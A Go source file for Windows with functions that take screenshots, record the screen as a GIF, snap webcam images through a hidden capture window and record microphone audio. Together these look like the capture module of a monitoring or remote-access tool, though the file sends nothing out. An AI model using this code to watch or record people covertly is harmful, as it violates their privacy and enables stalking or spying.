package media

import (
	"fmt"
	"image"
	"image/color/palette"
	"image/draw"
	"image/gif"
	"image/jpeg"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/image/bmp"
)

var (
	user32                      = syscall.NewLazyDLL("user32.dll")
	procSendMessageW            = user32.NewProc("SendMessageW")
	avicap32                    = syscall.NewLazyDLL("avicap32.dll")
	procCapCreateCaptureWindowW = avicap32.NewProc("capCreateCaptureWindowW")
	winmm                       = syscall.NewLazyDLL("winmm.dll")
	procMciSendStringW          = winmm.NewProc("mciSendStringW")
)

// CaptureScreen captures a screenshot of the primary display and saves it as PNG.
func CaptureScreen(outputPath string) error {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return err
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Save as JPEG with 85% quality for speed and compression
	return jpeg.Encode(file, img, &jpeg.Options{Quality: 85})
}

// CaptureWebcam snaps a JPEG image from the default webcam using avicap32.
func CaptureWebcam(outputPath string) error {
	windowName, _ := syscall.UTF16PtrFromString("WebcamCapture")
	hwnd, _, _ := procCapCreateCaptureWindowW.Call(
		uintptr(unsafe.Pointer(windowName)),
		0, // Hidden window style
		0, 0, 640, 480,
		0, 0,
	)
	if hwnd == 0 {
		return fmt.Errorf("failed to create capture window")
	}
	defer user32.NewProc("DestroyWindow").Call(hwnd)

	// WM_CAP_DRIVER_CONNECT = 1034 (0x040A)
	ret, _, _ := procSendMessageW.Call(hwnd, 1034, 0, 0)
	if ret == 0 {
		return fmt.Errorf("failed to connect to webcam driver")
	}
	// WM_CAP_DRIVER_DISCONNECT = 1035 (0x040B)
	defer procSendMessageW.Call(hwnd, 1035, 0, 0)

	// Wait 750ms for camera exposure/warm-up
	time.Sleep(750 * time.Millisecond)

	tmpBmpPath := outputPath + ".bmp"
	tmpBmpPathPtr, err := syscall.UTF16PtrFromString(tmpBmpPath)
	if err != nil {
		return err
	}

	// WM_CAP_FILE_SAVEDIBW = 1118 (0x045E)
	ret, _, _ = procSendMessageW.Call(hwnd, 1118, 0, uintptr(unsafe.Pointer(tmpBmpPathPtr)))
	if ret == 0 {
		return fmt.Errorf("failed to capture frame (no camera connected or in use)")
	}

	// Decode the temporary BMP file
	bmpFile, err := os.Open(tmpBmpPath)
	if err != nil {
		return fmt.Errorf("failed to open captured BMP: %v", err)
	}
	defer os.Remove(tmpBmpPath)
	defer bmpFile.Close()

	img, err := bmp.Decode(bmpFile)
	if err != nil {
		return fmt.Errorf("failed to decode BMP image: %v", err)
	}

	// Save it as a compressed JPEG
	outFile, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	return jpeg.Encode(outFile, img, &jpeg.Options{Quality: 85})
}

// resizeImageNearest scales down an image using nearest-neighbor interpolation.
func resizeImageNearest(img image.Image, scale float64) *image.RGBA {
	bounds := img.Bounds()
	newW := int(float64(bounds.Dx()) * scale)
	newH := int(float64(bounds.Dy()) * scale)
	newImg := image.NewRGBA(image.Rect(0, 0, newW, newH))
	for y := 0; y < newH; y++ {
		for x := 0; x < newW; x++ {
			oldX := int(float64(x) / scale)
			oldY := int(float64(y) / scale)
			newImg.Set(x, y, img.At(oldX, oldY))
		}
	}
	return newImg
}

// RecordScreen captures screen frames and encodes them to an animated GIF at 5 FPS.
func RecordScreen(duration time.Duration, outputPath string) error {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)

	var frames []*image.Paletted
	var delays []int

	interval := 200 * time.Millisecond
	endTime := time.Now().Add(duration)

	for time.Now().Before(endTime) {
		start := time.Now()
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return err
		}

		// Scale screen size down to 40% to keep animated GIF file size within limits
		resized := resizeImageNearest(img, 0.4)

		paletted := image.NewPaletted(resized.Bounds(), palette.Plan9)
		draw.Draw(paletted, paletted.Bounds(), resized, image.Point{}, draw.Src)

		frames = append(frames, paletted)
		delays = append(delays, 20) // 20 hundredths of a second = 200ms

		elapsed := time.Since(start)
		if elapsed < interval {
			time.Sleep(interval - elapsed)
		}
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	return gif.EncodeAll(file, &gif.GIF{
		Image:     frames,
		Delay:     delays,
		LoopCount: 0,
	})
}

// RecordAudio records microphone input and saves it to a WAV file using MCI commands.
func RecordAudio(duration time.Duration, outputPath string) error {
	openPtr, _ := syscall.UTF16PtrFromString("open new type waveaudio alias recsound")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(openPtr)), 0, 0, 0)
	defer func() {
		closePtr, _ := syscall.UTF16PtrFromString("close recsound")
		procMciSendStringW.Call(uintptr(unsafe.Pointer(closePtr)), 0, 0, 0)
	}()

	// Configure settings: Stereo, 44100Hz, 16bit
	setPtr, _ := syscall.UTF16PtrFromString("set recsound bitspersample 16 bytespersec 176400 channels 2 samplespersec 44100 alignment 4")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(setPtr)), 0, 0, 0)

	recordPtr, _ := syscall.UTF16PtrFromString("record recsound")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(recordPtr)), 0, 0, 0)

	time.Sleep(duration)

	stopPtr, _ := syscall.UTF16PtrFromString("stop recsound")
	procMciSendStringW.Call(uintptr(unsafe.Pointer(stopPtr)), 0, 0, 0)

	absPath, err := filepath.Abs(outputPath)
	if err != nil {
		absPath = outputPath
	}
	// Replace backward slashes with double slashes for MCI string compatibility
	absPath = strings.ReplaceAll(absPath, "\\", "\\\\")

	saveCmd := fmt.Sprintf("save recsound \"%s\"", absPath)
	savePtr, _ := syscall.UTF16PtrFromString(saveCmd)
	ret, _, _ := procMciSendStringW.Call(uintptr(unsafe.Pointer(savePtr)), 0, 0, 0)
	if ret != 0 {
		return fmt.Errorf("failed to save WAV file via MCI (error code %d)", ret)
	}

	return nil
}
